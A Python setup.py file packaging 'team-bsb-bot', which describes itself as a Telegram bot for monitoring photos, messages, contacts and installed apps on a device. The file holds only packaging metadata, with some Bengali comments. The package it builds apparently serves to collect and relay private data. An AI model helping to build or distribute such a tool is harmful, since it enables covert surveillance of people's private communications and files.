from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as f:
    long_description = f.read()

setup(
    name="team-bsb-bot",
    version="1.0.0",
    author="BLACK SPAMMER BD",
    author_email="shawponsp6@gmail.com",
    description="A Telegram bot package for monitoring photos, messages, contacts, and installed apps.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/BlackSpammerBd/team-bsb-bot",
    packages=find_packages(),
    install_requires=[
        "requests",
        "watchdog",
        "py-getch",  # নিশ্চিত কর py-getch সঠিক প্যাকেজ কিনা
        "pyTelegramBotAPI"
    ],
    entry_points={
        "console_scripts": [
            "bsb=team_bsb_bot.main:main",
        ],
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: POSIX :: Linux"  # Android সরিয়ে Linux রেখেছি
    ],
    python_requires=">=3.6",
)
